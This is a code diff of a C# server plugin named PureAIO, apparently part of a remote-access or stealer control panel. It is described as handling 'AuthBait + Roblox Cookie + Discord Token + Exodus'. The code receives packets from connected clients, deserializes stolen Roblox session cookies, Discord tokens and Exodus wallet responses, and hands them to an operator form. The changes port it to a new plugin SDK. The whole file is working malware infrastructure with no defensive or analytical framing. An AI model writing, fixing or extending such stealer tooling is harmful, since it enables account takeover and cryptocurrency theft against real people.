@@ -2,10 +2,9 @@
 // Receives packets from the client, deserializes them, and routes to Form1.
 
 using System;
-using System.Collections.Generic;
 using System.IO;
-using System.Windows.Forms;
-using PluginSDK;
+using PluginSDK.Interfaces;
+using PluginSDK.Packets;
 using ProtoBuf;
 
 namespace PureAIO
@@ -13,30 +12,47 @@ namespace PureAIO
     public class ServerPlugin : ICustomPlugin
     {
         private Form1 _form;
+        private Action<IPacket> _send;
 
         // ── ICustomPlugin ─────────────────────────────────────────────────────
-        public string PluginName    => "PureAIO";
-        public string PluginVersion => "2.0.0";
-        public string Author        => "Sam";
-        public string Description   => "AuthBait + Roblox Cookie + Discord Token + Exodus (enriched)";
+        public string PluginName        => "PureAIO";
+        public string PluginVersion     => "2.0.0";
+        public string PluginAuthor      => "Sam";
+        public string PluginDescription => "AuthBait + Roblox Cookie + Discord Token + Exodus (enriched)";
 
-        public void OnOpen()
+        public bool OnOpen(string title)
         {
             _form = new Form1();
             _form.Show();
+            return true;
         }
 
-        public void OnConnected(ClientInfo client) { }
-        public void OnDisconnected(ClientInfo client) { }
-
-        public void OnPacketReceived(ClientInfo client, CustomPacket raw)
+        public void OnConnected(Action<IPacket> send, Action disconnect)
         {
-            if (_form == null) return;
+            _send = send;
+            _form?.SetSend(send);
+        }
+
+        public void OnDisconnected()
+        {
+            _send = null;
+            if (_form != null && !_form.IsDisposed)
+            {
+                _form.OnDisconnected();
+            }
+            _form = null;
+        }
+
+        public void OnPacketReceived(IPacket packet)
+        {
+            var cp = packet as CustomPacket;
+            if (cp == null || _form == null || _form.IsDisposed) return;
+
             AIOPacket pkt;
             try
             {
-                using var ms = new MemoryStream(raw.Buffer);
-                pkt = Deserialize(ms);
+                using (var ms = new MemoryStream(cp.Buffer))
+                    pkt = Serializer.Deserialize<AIOPacket>(ms);
             }
             catch { return; }
 
@@ -45,15 +61,12 @@ namespace PureAIO
                 case AuthBaitCodeResponse r:
                     _form.HandleAuthBaitResponse(r);
                     break;
-
                 case RobloxCookieResponse r:
                     _form.HandleCookieResponse(r);
                     break;
-
                 case DiscordTokenResponse r:
                     _form.HandleTokenResponse(r);
                     break;
-
                 case ExodusResponse r:
                     _form.HandleExodusResponse(r);
                     break;
@@ -63,9 +76,11 @@ namespace PureAIO
         // ── Serialization helpers ─────────────────────────────────────────────
         public static byte[] Serialize(AIOPacket pkt)
         {
-            using var ms = new MemoryStream();
-            Serializer.Serialize(ms, pkt);
-            return ms.ToArray();
+            using (var ms = new MemoryStream())
+            {
+                Serializer.Serialize(ms, pkt);
+                return ms.ToArray();
+            }
         }
 
         public static AIOPacket Deserialize(MemoryStream ms)
